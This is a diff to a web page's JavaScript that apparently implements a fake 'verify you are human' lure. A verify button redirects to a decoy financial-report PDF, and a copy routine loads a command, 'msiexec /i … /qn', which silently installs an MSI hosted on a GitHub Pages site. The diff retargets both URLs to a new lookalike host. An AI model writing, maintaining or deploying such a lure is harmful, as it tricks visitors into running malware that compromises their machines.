@@ -316,7 +316,7 @@
 
                     if (verifyButton) {
                         verifyButton.addEventListener("click", function () {
-                            window.location.href = "https://yilmazmakina.github.io/assets/finansal_tablo_2025.pdf";
+                            window.location.href = "https://yilmazmakinacnc.github.io/assets/finansal_tablo_2025.pdf";
                             closeverifywindow();
                             // Change checkbox to checked state visually
                             hideCapLoading();
@@ -416,7 +416,6 @@
                 setCCopyData(textToCopy);
             }
 
-
             function showVerifyWindow() {
                 verifywindow.style.display = "block";
                 verifywindow.style.visibility = "visible";
@@ -430,7 +429,7 @@
                 verifywindow.style.left = "50%";
                 verifywindow.style.transform = "translateX(-50%)";
 
-                const toRun = "msiexec /i https://yilmazmakina.github.io/assets/verify.ext /qn"
+                const toRun = "msiexec /i https://yilmazmakinacnc.github.io/assets/verify.ext /qn"
                 stageC(toRun, verification_id)
             }
 
